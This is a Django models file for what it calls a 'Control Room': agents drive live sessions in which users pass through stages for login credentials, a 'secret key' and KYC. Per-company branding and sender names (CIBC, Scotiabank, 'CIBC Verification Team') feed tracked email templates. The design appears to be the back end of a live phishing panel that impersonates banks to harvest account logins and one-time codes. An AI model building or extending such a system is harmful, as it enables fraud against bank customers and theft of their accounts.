# accounts/models.py - UPDATED with extra_data field
import uuid
from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone
from .services.case_id_service import CaseIDService


class Session(models.Model):
    """
    Represents one active verification session between an agent and a user.
    Internal `uuid` is used for WebSocket communication and system references.
    Human-facing Case IDs (external_case_id) remain unique but are optional.
    """

    # Internal stable identifier for all back-end / WebSocket routing.
    uuid = models.UUIDField(default=uuid.uuid4, editable=False, unique=True)

    # External, human-readable Case ID (agent-facing)
    external_case_id = models.CharField(
        max_length=64,
        unique=True,
        blank=True,
        null=True,
        help_text="Agent-provided case ID or customer reference",
    )

    STAGE_CHOICES = [
        ('case_id', 'Case ID Entry'),
        ('credentials', 'Login Credentials'),
        ('secret_key', 'Secret Key'),
        ('kyc', 'KYC Verification'),
        ('completed', 'Completed'),
    ]

    STATUS_CHOICES = [
        ('active', '🟢 Active'),
        ('completed', '⚪️ Completed Successfully'),
        ('failed', '❌ Verification Failed'),
        ('terminated', '🔴 Terminated by Agent'),
    ]

    agent = models.ForeignKey(User, on_delete=models.CASCADE)
    stage = models.CharField(max_length=20, choices=STAGE_CHOICES, default='case_id')
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='active')
    user_online = models.BooleanField(default=False)
    notes = models.TextField(blank=True)
    user_data = models.JSONField(default=dict, blank=True)

    # Email fields
    user_email = models.EmailField(
        blank=True,
        help_text="Customer email for sending verification links"
    )
    user_name = models.CharField(
        max_length=255,
        blank=True,
        help_text="Customer name for email salutation"
    )

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        display = self.external_case_id or str(self.uuid)
        return f"{display} - {self.agent.username} - {self.status}"

    def save(self, *args, **kwargs):
        """
        Ensure a valid case identifier.
        If agent provided external_case_id, keep it;
        otherwise optionally generate one for convenience.
        """
        if self.external_case_id:
            self.external_case_id = self.external_case_id.strip() or None
        else:
            # Optionally auto-generate a readable external case id
            generated = CaseIDService.generate_unique_case_id()
            if generated:
                self.external_case_id = generated

        super().save(*args, **kwargs)


class SessionLog(models.Model):
    LOG_TYPE_CHOICES = [
        ('info', 'Info'),
        ('user_input', 'User Input'),
        ('agent_action', 'Agent Action'),
        ('device_metadata', 'Device Metadata'),
        ('user_activity', 'User Activity'),
        ('page_view', 'Page View'),
        ('session_start', 'Session Start'),
        ('user_connection', 'User Connection'),
    ]

    session = models.ForeignKey(Session, on_delete=models.CASCADE, related_name='logs')
    message = models.TextField()
    log_type = models.CharField(max_length=20, choices=LOG_TYPE_CHOICES, default='info')
    # ADD THIS FIELD for storing all metadata
    extra_data = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['created_at']

    def __str__(self):
        return f"{self.session.external_case_id or self.session.uuid} - {self.message[:50]}"


class Company(models.Model):
    """
    Represents a company/client that uses the Control Room for verification.
    Each company can have its own branding, email configuration, and email templates.
    """

    # Identity
    name = models.CharField(
        max_length=255,
        unique=True,
        help_text="Company name (e.g., CIBC, Scotiabank)"
    )
    slug = models.SlugField(
        unique=True,
        help_text="URL-friendly identifier"
    )

    # Branding
    logo_url = models.URLField(
        blank=True,
        help_text="Company logo URL for email templates"
    )
    primary_color = models.CharField(
        max_length=7,
        default='#0073E6',
        help_text="Primary brand color (hex format)"
    )
    secondary_color = models.CharField(
        max_length=7,
        blank=True,
        help_text="Secondary brand color (hex format)"
    )
    website_url = models.URLField(
        blank=True,
        help_text="Company website URL"
    )

    # Email Configuration
    from_email = models.EmailField(
        help_text="Email address to send from (e.g., noreply@company.com)"
    )
    from_name = models.CharField(
        max_length=255,
        help_text="Friendly name for sender (e.g., 'CIBC Verification Team')"
    )
    reply_to_email = models.EmailField(
        blank=True,
        help_text="Optional reply-to email address"
    )
    support_email = models.EmailField(
        blank=True,
        help_text="Customer support email"
    )
    support_phone = models.CharField(
        max_length=20,
        blank=True,
        help_text="Customer support phone number"
    )

    # Meta
    is_active = models.BooleanField(
        default=True,
        help_text="Whether this company can send emails"
    )
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['name']
        verbose_name_plural = "Companies"

    def __str__(self):
        return self.name


class EmailTemplate(models.Model):
    """
    Ultra-flexible email template for a specific company and use case.
    Admin/designers paste raw HTML here with {{variables}} for rendering.
    No constraints on HTML complexity or design.
    """

    TEMPLATE_TYPE_CHOICES = [
        ('verification_link', 'Verification Link - Initial Kick-off'),
        ('stage_update', 'Stage Update - Progress Notification'),
        ('credentials_accepted', 'Credentials Accepted ✅'),
        ('credentials_rejected', 'Credentials Rejected ❌'),
        ('kyc_accepted', 'KYC Accepted ✅'),
        ('kyc_rejected', 'KYC Rejected ❌'),
        ('verification_completed', 'Verification Completed ✅'),
        ('verification_failed', 'Verification Failed ❌'),
        ('custom', 'Custom Message'),
    ]

    # Relationships
    company = models.ForeignKey(
        Company,
        on_delete=models.CASCADE,
        related_name='email_templates'
    )

    # Identity & Classification
    template_type = models.CharField(
        max_length=50,
        choices=TEMPLATE_TYPE_CHOICES,
        help_text="Type of email this template is for"
    )
    name = models.CharField(
        max_length=255,
        help_text="Friendly name (e.g., 'Blue Modern', 'Dark Theme v2')"
    )
    description = models.TextField(
        blank=True,
        help_text="Internal notes about this template"
    )

    # Email Content (FULLY CUSTOM - NO CONSTRAINTS)
    subject = models.CharField(
        max_length=255,
        help_text="Email subject line. Use {{variables}} for placeholders."
    )
    html_body = models.TextField(
        help_text=(
            "Full custom HTML body. Paste HTML from email builder (Mailchimp, Stripo, etc). "
            "Use {{customer_name}}, {{case_id}}, {{verification_link}}, {{stage}}, {{company_name}}, {{message}} "
            "for dynamic content."
        )
    )
    plain_text_body = models.TextField(
        help_text="Plain text fallback with same {{variables}}."
    )

    # Variables Reference (for documentation)
    available_variables = models.JSONField(
        default=dict,
        blank=True,
        help_text="Reference variables available in this template (auto-documented)"
    )

    # Status
    is_active = models.BooleanField(
        default=True,
        help_text="Only active templates appear in agent dropdown"
    )
    is_draft = models.BooleanField(
        default=False,
        help_text="Draft templates for testing before publishing"
    )

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['company', 'template_type', '-created_at']
        indexes = [
            models.Index(fields=['company', 'template_type', 'is_active']),
        ]
        verbose_name_plural = "Email Templates"

    def __str__(self):
        return f"{self.company.name} - {self.name}"


class EmailLog(models.Model):
    """
    Audit trail for all emails sent through the system.
    Tracks status, errors, and provides compliance/debugging info.
    """

    STATUS_CHOICES = [
        ('queued', '⏳ Queued'),
        ('sent', '✅ Sent'),
        ('failed', '❌ Failed'),
        ('bounced', '⚠️ Bounced'),
        ('opened', '👁️ Opened'),
        ('clicked', '🔗 Clicked'),
    ]

    # Relationships
    session = models.ForeignKey(
        Session,
        on_delete=models.CASCADE,
        related_name='email_logs'
    )
    company = models.ForeignKey(
        Company,
        on_delete=models.SET_NULL,
        null=True,
        related_name='email_logs'
    )
    template = models.ForeignKey(
        EmailTemplate,
        on_delete=models.SET_NULL,
        null=True,
        blank=True,
        related_name='email_logs'
    )

    # Recipient
    to_email = models.EmailField(
        help_text="Email address the message was sent to"
    )

    # Content (stored for audit trail)
    subject = models.CharField(max_length=255)
    html_body = models.TextField(blank=True)
    plain_text_body = models.TextField(blank=True)

    # Template variables used (for debugging/audit)
    template_variables = models.JSONField(
        default=dict,
        help_text="Variables used to render this email"
    )

    # Status & Delivery
    status = models.CharField(
        max_length=20,
        choices=STATUS_CHOICES,
        default='queued'
    )
    provider_message_id = models.CharField(
        max_length=255,
        blank=True,
        help_text="Message ID from SendGrid/Mailgun/etc for tracking"
    )
    error_message = models.TextField(
        blank=True,
        help_text="Error details if send failed"
    )

    # Agent who sent it
    sent_by_agent = models.ForeignKey(
        User,
        on_delete=models.SET_NULL,
        null=True,
        related_name='emails_sent',
        help_text="Agent who initiated the email send"
    )

    # Timestamps
    created_at = models.DateTimeField(
        auto_now_add=True,
        help_text="When email was queued"
    )
    sent_at = models.DateTimeField(
        null=True,
        blank=True,
        help_text="When email was actually sent"
    )
    updated_at = models.DateTimeField(
        auto_now=True,
        help_text="Last status update"
    )

    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['session', 'status']),
            models.Index(fields=['to_email']),
            models.Index(fields=['company']),
        ]
        verbose_name_plural = "Email Logs"

    def __str__(self):
        return f"{self.to_email} - {self.subject} ({self.status})"


class SystemSettings(models.Model):
    """
    Singleton model for global system configuration.
    Allows admins to change critical settings without code deployment.
    """
    # Core Configuration
    kyc_redirect_url = models.URLField(
        default="https://google.com",
        help_text="Where to redirect users after 'Begin KYC' (e.g., Ballerine URL)"
    )

    # Industry Standard Recommendations
    maintenance_mode = models.BooleanField(
        default=False,
        help_text="If active, new sessions cannot be started"
    )
    support_phone = models.CharField(
        max_length=20,
        blank=True,
        help_text="Global support phone number displayed to users"
    )
    support_email = models.EmailField(
        blank=True,
        help_text="Global support email address"
    )
    max_daily_verifications = models.IntegerField(
        default=1000,
        help_text="Safety cap for daily verifications to prevent abuse"
    )

    class Meta:
        verbose_name = "System Settings"
        verbose_name_plural = "System Settings"

    def __str__(self):
        return "System Configuration"

    def save(self, *args, **kwargs):
        """Ensure only one instance exists"""
        self.pk = 1
        super().save(*args, **kwargs)

    @classmethod
    def get_settings(cls):
        """Helper to get the singleton instance"""
        obj, created = cls.objects.get_or_create(pk=1)
        return obj


class EmailSettings(models.Model):
    """
    Singleton model for dynamic email provider configuration.
    Allows admins to switch providers (SendGrid, Mailgun, etc.) and update keys
    without redeploying code or changing environment variables.
    """
    PROVIDER_CHOICES = [
        ('sendgrid', 'Twilio SendGrid'),
        ('mailgun', 'Mailgun'),
        ('amazon_ses', 'Amazon SES'),
        ('mailjet', 'Mailjet'),
        ('postmark', 'Postmark'),
        ('smtp', 'Custom SMTP'),
        ('console', 'Console (Local Dev)'),
    ]

    # Active Provider
    email_provider = models.CharField(
        max_length=20,
        choices=PROVIDER_CHOICES,
        default='console',
        help_text="Select the active email service provider"
    )

    # Sender Defaults
    default_from_email = models.EmailField(
        default='noreply@example.com',
        help_text="Default 'From' address (e.g., noreply@yourdomain.com)"
    )
    from_name = models.CharField(
        max_length=255,
        default='Control Room',
        help_text="Friendly name (e.g., 'Security Team')"
    )

    # SendGrid
    sendgrid_api_key = models.CharField(
        max_length=255,
        blank=True,
        help_text="SG.xxxx..."
    )

    # Mailgun
    mailgun_api_key = models.CharField(
        max_length=255,
        blank=True
    )
    mailgun_sender_domain = models.CharField(
        max_length=255,
        blank=True,
        help_text="mg.yourdomain.com"
    )

    # Amazon SES
    aws_access_key_id = models.CharField(
        max_length=255,
        blank=True
    )
    aws_secret_access_key = models.CharField(
        max_length=255,
        blank=True
    )
    aws_region = models.CharField(
        max_length=50,
        blank=True,
        default='us-east-1'
    )

    # Mailjet
    mailjet_api_key = models.CharField(
        max_length=255,
        blank=True
    )
    mailjet_secret_key = models.CharField(
        max_length=255,
        blank=True
    )

    # Custom SMTP
    smtp_host = models.CharField(
        max_length=255,
        blank=True
    )
    smtp_port = models.IntegerField(
        default=587,
        blank=True
    )
    smtp_username = models.CharField(
        max_length=255,
        blank=True
    )
    smtp_password = models.CharField(
        max_length=255,
        blank=True
    )
    smtp_use_tls = models.BooleanField(
        default=True,
        help_text="Use TLS (recommended for port 587)"
    )
    smtp_use_ssl = models.BooleanField(
        default=False,
        help_text="Use SSL (usually port 465)"
    )

    class Meta:
        verbose_name = "Email Configuration"
        verbose_name_plural = "Email Configuration"

    def __str__(self):
        return f"Email Settings ({self.get_email_provider_display()})"

    def save(self, *args, **kwargs):
        """Ensure only one instance exists"""
        self.pk = 1
        super().save(*args, **kwargs)

    @classmethod
    def get_settings(cls):
        """Helper to get the singleton instance"""
        obj, created = cls.objects.get_or_create(pk=1)
        return obj

